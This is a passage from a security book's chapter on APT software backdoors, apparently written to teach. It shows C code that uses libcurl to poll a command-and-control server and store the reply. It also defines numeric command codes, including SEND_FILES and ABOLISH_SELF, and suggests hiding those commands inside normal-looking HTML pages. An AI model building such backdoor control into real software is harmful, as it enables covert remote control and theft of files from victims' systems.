<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1aa" class="pf w2 h2" data-page-no="1aa"><div class="pc pc1aa w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 10: APT Software Backdoors<span class="_ _9"> </span><span class="ff1 fs9 lsa">403</span></div><div class="t m0 x4 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">For additional functionality<span class="_ _3"/>, howe<span class="_ _0"/>ver<span class="_ _2"/>, we could create the heartbeat.php page </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">and perform any actions we’<span class="_ _2"/>d like, such as alerting us via e-mail of the acti<span class="_ _0"/>vity or </div><div class="t m0 x3 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">logging the entry in a database. </div><div class="t m0 x3 h7 y2547 ff1 fs3 fc0 sc0 ls0 ws0">Command and Control: Backdoor Control</div><div class="t m0 x3 hd y2548 ff4 fs7 fc0 sc0 ls0 ws0">Controlling the backdoor via the communication from the command-and-control </div><div class="t m0 x3 hd y3e1 ff4 fs7 fc0 sc0 ls0 ws0">server is a straightforw<span class="_ _0"/>ard task. Let’<span class="_ _0"/>s e<span class="_ _0"/>xplore ways to control the operation of the </div><div class="t m0 x3 hd y99d ff4 fs7 fc0 sc0 ls0 ws0">backdoor from the C2 server via HTTP<span class="_ _1b"/>.</div><div class="t m0 x4 hd y3e3 ff4 fs7 fc0 sc0 ls19 ws0">At the most basic le<span class="_ _0"/>vel, we can simply hard-code a specic number or string<span class="_ _0"/> </div><div class="t m0 x3 hd y3e4 ff4 fs7 fc0 sc0 ls19 ws0">to perform a specic action. For ease of understanding, we’<span class="_ _0"/>ll stick with numbers </div><div class="t m0 x3 hd y3e5 ff4 fs7 fc0 sc0 ls19 ws0">that correspond to specic commands. Ho<span class="_ _0"/>wev<span class="_ _0"/>er<span class="_ _0"/>, in practice, we might want to<span class="_ _0"/> </div><div class="t m0 x3 hd y217 ff4 fs7 fc0 sc0 ls19 ws0">make them obscure or otherwise random components of a seemingly normal<span class="_ _0"/> </div><div class="t m0 x3 hd y3e6 ff4 fs7 fc0 sc0 ls19 ws0">html page.</div><div class="t m0 x4 hd y3e7 ff4 fs7 fc0 sc0 ls13 ws0">As usual, we’ll use cURL to request the le from our C2 serv<span class="_ _0"/>er; howe<span class="_ _0"/>v<span class="_ _0"/>er<span class="_ _0"/>, </div><div class="t m0 x3 hd y3e8 ff4 fs7 fc0 sc0 ls13 ws0">rather than writing the contents recei<span class="_ _0"/>ved from the serv<span class="_ _0"/>er to a le, we’ll sa<span class="_ _0"/>ve them </div><div class="t m0 x3 hd y3e9 ff4 fs7 fc0 sc0 ls13 ws0">to a v<span class="_ _0"/>ariable that we can then interpret. In the following e<span class="_ _0"/>xample, we’<span class="_ _2"/>re using the </div><div class="t m0 x3 hd y3ea ff4 fs7 fc0 sc0 ls13 ws0">write_tov<span class="_ _0"/>ar_callback function, which we dene to sa<span class="_ _0"/>ve the output to a character<span class="_ _0"/> </div><div class="t m0 x3 hd y2f9 ff4 fs7 fc0 sc0 ls13 ws0">array: </div><div class="t m0 x3 h44 y263a fff fse fc0 sc0 ls0 ws0"> char responseBuf[4096];</div><div class="t m0 x3 h44 y263b fff fse fc0 sc0 ls0 ws0"> memset (responseBuf, ‘\0’, sizeof(responseBuf));</div><div class="t m0 x3 h44 y263c fff fse fc0 sc0 ls0 ws0"> curl_easy_setopt(curl, CURLOPT_URL, GET_COMMAND_URL);/</div><div class="t m0 x3 h44 y263d fff fse fc0 sc0 ls0 ws0"> curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_tovar_callback);</div><div class="t m0 x3 h44 y263e fff fse fc0 sc0 ls0 ws0"> curl_easy_setopt(curl, CURLOPT_WRITEDATA, &amp;responseBuf);</div><div class="t m0 x4 hd y263f ff4 fs7 fc0 sc0 ls0 ws0">The write_tov<span class="_ _0"/>ar_callback function simply writes the response from the serv<span class="_ _0"/>er to </div><div class="t m0 x3 hd y2640 ff4 fs7 fc0 sc0 ls0 ws0">the character array responseBuf. The function is sho<span class="_ _0"/>wn in the follo<span class="_ _0"/>wing example:</div><div class="t m0 x3 h40 y2641 fff fs5 fc0 sc0 ls0 ws0">size_t static write_tovar_callback(void *buffer, size_t size, size_t nmemb, </div><div class="t m0 x3 h40 y2642 fff fs5 fc0 sc0 ls0 ws0">void *userp)</div><div class="t m0 x3 h40 y2643 fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y2644 fff fs5 fc0 sc0 ls0 ws0">    strcat( userp, buffer);</div><div class="t m0 x3 h40 y2645 fff fs5 fc0 sc0 ls0 ws0">    return (size *nmemb);</div><div class="t m0 x3 h40 y2646 fff fs5 fc0 sc0 ls0 ws0">}</div><div class="t m0 x4 hd y2647 ff4 fs7 fc0 sc0 ls0 ws0">Once responseBuf contains the page returned by the server<span class="_ _2"/>, we can search or </div><div class="t m0 x3 hd y2648 ff4 fs7 fc0 sc0 ls0 ws0">interpret the data. In this case, the response from the server is a single v<span class="_ _0"/>e-digit </div><div class="t m0 x3 hd y2649 ff4 fs7 fc0 sc0 ls0 ws0">number that we use to perform a predened action.</div><div class="t m0 x3 h44 y264a fff fse fc0 sc0 ls0 ws0">#define ABOLISH_SELF 11111</div><div class="t m0 x3 h44 y264b fff fse fc0 sc0 ls0 ws0">#define CALL_HOME 22222</div><div class="t m0 x3 h44 y264c fff fse fc0 sc0 ls0 ws0">#define SEND_FILES 33333</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>